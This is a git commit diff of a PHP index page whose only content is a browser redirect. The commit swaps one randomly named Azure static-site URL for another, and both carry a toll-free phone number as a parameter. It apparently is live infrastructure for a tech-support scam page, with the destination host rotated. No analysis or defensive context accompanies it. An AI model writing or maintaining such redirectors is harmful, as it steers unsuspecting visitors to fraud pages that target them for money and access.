e18b7fe38f51b5558f237993dff8d9b016d99bba
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-06 22:11:25 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://waitfor876itubu3weicnd8w.z20.web.core.windows.net/index.html?Aniph=1-833-981-3001");
+header("Location: https://allow7tokrduh7gslekingxd.z44.web.core.windows.net/index.html?Aniph=1-833-981-3001");
 
 exit;
 ?>
